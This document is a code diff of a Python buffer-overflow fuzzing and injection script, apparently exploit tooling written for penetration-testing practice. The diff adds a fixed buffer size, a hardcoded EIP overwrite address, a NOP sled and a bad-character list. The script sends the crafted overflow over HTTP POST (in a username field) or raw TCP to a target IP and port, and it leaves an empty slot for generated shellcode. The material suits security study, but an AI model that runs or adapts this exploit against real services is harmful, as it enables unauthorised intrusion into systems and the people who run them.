@@ -7,32 +7,30 @@ import time
 from requests import exceptions
 
 def parseArgs():
-  args = argparse.ArgumentParser(description="Fuzz and Inject payloads for Buffer Overflows")
+  args = argparse.ArgumentParser(description="Fuzz and Inject payloads for Buffer bufferOverflows")
   args.add_argument('--mode', help="Mode used during the execution of the script [fuzz, inject]")
   args.add_argument('-c', help="Type of connection to use during fuzzing [http, raw-tcp]")
   args.add_argument('IP', help="IP Address of the target to fuzz on")
   args.add_argument('Port', help="Port of the target service to fuzz on")
   return args.parse_args()
 
-def checkValidOption(string, array):
+def checkValidOption(string, array, context):
   try:
     array.index(string)
     return string
   except:
-    print ("[-] {0} is not a valid connection type".format(string))
-    print ("[-] Valid connection type are {0}".format(array))
+    print ("[-] {0} is not a valid {1}".format(string, context))
+    print ("[-] Valid {1} are {0}".format(array, context))
     exit()
 
 class Buffer:
-    size = 100
-    increment = 100
-  # This class will need to be manually filled 
-  # up in order to build your BOF exploit
-    overflow = 'A' * size
-    offset = 'B' * 4
-    eip = 'C' * 4
-    nopsled= '' # Replace with NOP instructions for padding ( "\x90" * 16 )
-    badchars = (
+    bufferSize = 780 # Size of the buffer in bytes
+    bufferSizeInc = 100 # Incremental value in bytes
+    bufferOverflow = 'A' * bufferSize
+    bufferOffset = '' # 'B' * 4
+    eip = "\x83\x0c\x09\x10" # Replace with a 32 bits address once EIP register is controlled
+    nopsled= "\x90" * 16 # Replace with NOP instructions for padding ( "\x90" * 16 )
+    badchars = ( # All bad characters except \x00, filter them as you need
       "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
       "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
       "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
@@ -50,40 +48,39 @@ class Buffer:
       "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
       "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
     )
-    shellcode = (
+
+    shellcode = ( # Put your generated shellcode here ↓
       ""
     )
 
     def __init__(self):
       return
 
-    def incrementOverflow(self):
-      self.size += self.increment
-      self.overflow = 'A' * self.size
+    def incBufferOverflow(self):
+      self.bufferSize += self.bufferSizeInc
+      self.bufferOverflow = 'A' * self.bufferSize
 
     def getBufferSize(self):
-      return self.size
-    
-    def getHeaders(self):
-      return "headers"
+      return self.bufferSize
     
     def getEIP(self):
       return self.eip
     
-    def getOverflow(self):
-      return self.overflow
+    def getBufferOverflow(self):
+      return self.bufferOverflow
     
     def getBadchars(self):
       return self.badchars
     
-    def getOffset(self):
-      return self.offset
+    def getBufferOffset(self):
+      return self.bufferOffset
 
     def getShellcode(self):
       return self.shellcode
     
     def getBufferString(self):
-      return bytes("username={0}&password=a".format(self.overflow + self.eip + self.nopsled + (self.badchars if self.shellcode == '' else self.shellcode)), encoding='latin-1')
+      buffer = self.bufferOverflow + self.bufferOffset + self.eip + self.nopsled + (self.badchars if self.shellcode == '' else self.shellcode)
+      return bytes("username={0}&password=a".format(buffer), encoding='latin-1')
 
 class Connector:
   connectionType = ['http', 'raw-tcp']
@@ -91,7 +88,7 @@ class Connector:
   sock = None
   targetIP = ""
   targetPort = 80
-  # Variables below are for HTTP Post request and should reviewed manually
+  # Variables below are for HTTP Post request and should be reviewed manually
   targetURL = ""
   headers = {
         	'Host': targetIP,
@@ -104,7 +101,7 @@ class Connector:
   }
 
   def __init__(self, connection, IP, Port):
-    self.connection = checkValidOption(connection, self.connectionType)
+    self.connection = checkValidOption(connection, self.connectionType, 'connection type')
     self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.targetIP = IP
     self.targetPort = Port
@@ -112,16 +109,13 @@ class Connector:
     print ("[+] Connection type selected: {0}".format(self.connection))
     return
 
-  def send(self, buffer, headers=""):
+  def send(self, buffer):
     try: 
       if self.connectionType[0] == self.connection:
-        requests.post(self.targetURL,data=buffer, headers=self.headers)
+        requests.post(self.targetURL,data=buffer, headers=self.headers,timeout=5)
       elif self.connectionType[1] == self.connection:
         self.sock.send(buffer)
-    except requests.exceptions.ConnectTimeout:
-      print ("\n[-] Cannot Connect to: {0}:{1}".format(self.targetIP,self.targetPort))
-      exit()
-    except socket.error as e:
+    except:
       print ("\n[-] Cannot Connect to: {0}:{1}".format(self.targetIP,self.targetPort))
       exit()
     return
@@ -150,7 +144,7 @@ class Fuzzer:
   def __init__(self, connector, mode):
       self.connector = connector
       self.buffer = Buffer()
-      self.mode = checkValidOption(mode, self.modeType)
+      self.mode = checkValidOption(mode, self.modeType, 'mode')
       return
   
   def start(self):
@@ -168,10 +162,10 @@ class Fuzzer:
     self.connector.close()
     return
 
-  def fuzz(self,):
+  def fuzz(self):
     while True:     
       self.inject()
-      self.buffer.incrementOverflow()
+      self.buffer.incBufferOverflow()
       time.sleep(self.requestLatency)
 
 def main():
